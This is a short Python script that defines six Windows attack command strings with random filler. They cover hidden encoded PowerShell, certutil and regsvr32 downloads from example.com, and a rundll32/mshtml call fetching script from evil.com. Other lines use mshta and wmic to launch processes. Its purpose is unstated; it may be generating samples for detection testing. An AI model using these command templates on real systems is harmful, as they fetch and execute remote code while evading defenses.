import os
import socket
import subprocess
import random
import string

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

payload1 = f"powershell -nop -w hidden -e {''.join(random.choices(string.ascii_uppercase + string.digits, k=40))}"
payload2 = f"cmd.exe /c ping 127.0.0.1 -n 5 && certutil -urlcache -split -f http://example.com/{random_string()}"
payload3 = f"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();GetObject(\"script:http://evil.com/{random_string()}\")"
payload4 = f"mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run(\"\"powershell -nop -w hidden -c {random_string()}\"\", 0, False)\")"
payload5 = f"regsvr32 /s /u /i:http://example.com/{random_string()}.sct scrobj.dll"
payload6 = f"wmic process call create '{random_string()}.exe'"